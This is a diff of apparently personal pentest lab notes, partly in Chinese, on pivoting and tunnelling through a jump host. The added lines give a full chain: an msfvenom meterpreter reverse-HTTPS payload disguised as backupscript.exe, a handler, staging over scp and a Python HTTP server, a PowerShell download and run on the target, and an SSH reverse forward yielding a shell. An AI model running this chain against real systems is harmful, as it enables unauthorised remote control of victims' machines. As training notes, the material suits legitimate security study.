@@ -1,3 +1,9 @@
+攻击流程
+  拿到跳板机 foodhold
+  扫描内网网段
+  设置本地和远程转发
+
+
 横向移动、跳板、隧道，对比
 Laternal movement:  same network
 Pivot:  cross network
@@ -73,24 +79,40 @@ msf6 > use 0
 msf6 > set rhosts 172.16.5.19
 msf6 > run
 
-proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123      假设已知用户和密码
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe      生成 playload
+msf6 > use exploit/multi/handler                                                                            相较于 nc，开始多端口监听，可切换 session，且适配 msf 的 playload
+sudo msfconsole -q
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
+msf6 > set LHOST 0.0.0.0
+msf6 > set LPORT 8000
+msf6 > run
+
+scp backupscript.exe ubuntu@10.129.228.103:~/                                                               将 playload 复制到跳板机
+
+ssh -D 9050 ubuntu@10.129.228.103                                                                           设置远程转发
+
+ubuntu@Webserver$ python3 -m http.server 8123                                                               在跳板机开启 http 服务端
+
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123                                                   假设已知用户和密码
+
+PS > Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\\backupscript.exe"     在目标，从跳板，下载 playload
+
+ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN                                              远程转发，跳板机 8080 到 攻击机 8000
+
+PS > C:\backupscript.exeC:\backupscript.exe                                                                 启动 playload
+
+meterpreter > shell      获得 反向 shell
 
 
 
 
 
 
-Steps:
-  get foothold
-  ping internal network
-  setup tunnel
-  atc
 
 
-Port forwards:
-  ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
-  ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
-  ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+
   
   meterpreter > help portfwd
 
